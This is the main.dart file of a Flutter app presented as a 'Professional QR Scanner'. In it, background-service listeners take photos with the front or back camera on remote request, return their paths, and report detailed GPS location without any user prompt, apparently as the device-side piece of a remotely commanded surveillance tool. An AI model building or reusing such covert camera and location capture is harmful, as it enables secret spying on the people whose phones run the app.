// lib/main.dart
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:camera/camera.dart';
import 'package:geolocator/geolocator.dart'; // For Position type

import 'screens/qr_scanner_screen.dart';
import 'services/background_service.dart';
import 'services/camera_service.dart';
import 'services/location_service.dart';
import 'services/file_system_service.dart';
import 'utils/constants.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeBackgroundService();
  runApp(const EthicalScannerApp());
}

class EthicalScannerApp extends StatefulWidget {
  const EthicalScannerApp({super.key});
  @override
  State<EthicalScannerApp> createState() => _EthicalScannerAppState();
}

class _EthicalScannerAppState extends State<EthicalScannerApp> {
  final svc = FlutterBackgroundService();

  @override
  void initState() {
    super.initState();

    // --- Listen for requests from the background service to execute MethodChannel calls ---

    // Listener for take_picture requests from background
    svc.on('execute_take_picture_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final camService = CameraService();
      final String? lensDirectionArg = args['camera'] as String?;
      final String? originalCommandRef =
          args['original_command_ref'] as String?;

      if (lensDirectionArg == null || originalCommandRef == null) {
        debugPrint(
          "EthicalScannerAppState: Missing 'camera' or 'original_command_ref' in execute_take_picture_from_ui",
        );
        return;
      }

      final lensDirection =
          lensDirectionArg == 'back'
              ? CameraLensDirection.back
              : CameraLensDirection.front;

      debugPrint(
        "EthicalScannerAppState: UI received request to take picture with ${lensDirection.name}",
      );

      final XFile? file = await camService.takePicture(
        lensDirection: lensDirection,
      );

      if (file == null) {
        svc.invoke('execute_take_picture_from_ui_result', {
          'status': 'error',
          'payload': {
            'message': 'No image captured (UI request for background)',
          },
          'original_command_ref': originalCommandRef,
        });
      } else {
        svc.invoke('execute_take_picture_from_ui_result', {
          'status': 'success',
          'payload': {'path': file.path},
          'original_command_ref': originalCommandRef,
        });
      }
    });

    // NEW: UI ping/pong system for health check
    svc.on('ui_ping').listen((_) {
      debugPrint("EthicalScannerAppState: Received UI ping, responding with pong");
      svc.invoke('ui_pong', {});
    });

    // Optional: Listener for get_location (if needed for UI updates)
    svc.on(SIO_CMD_GET_LOCATION).listen((_) async {
      debugPrint(
        "EthicalScannerAppState: Received SIO_CMD_GET_LOCATION event (likely from background).",
      );
      final locSvc = LocationService();
      try {
        final Position? loc = await locSvc.getCurrentLocation();
        if (loc == null)
          throw Exception('Location unavailable from UI listener');
        
        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
          'status': 'success',
          'payload': {
            'latitude': loc.latitude,
            'longitude': loc.longitude,
            'accuracy': loc.accuracy,
            'altitude': loc.altitude,
            'speed': loc.speed,
            'timestamp_gps': loc.timestamp?.toIso8601String(),
          },
        });
      } catch (e) {
        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
          'status': 'error',
          'payload': {'message': e.toString()},
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Professional QR Scanner',
      theme: ThemeData.dark(),
      home: const Directionality(
        textDirection: TextDirection.ltr,
        child: QrScannerScreen(),
      ),
    );
  }
}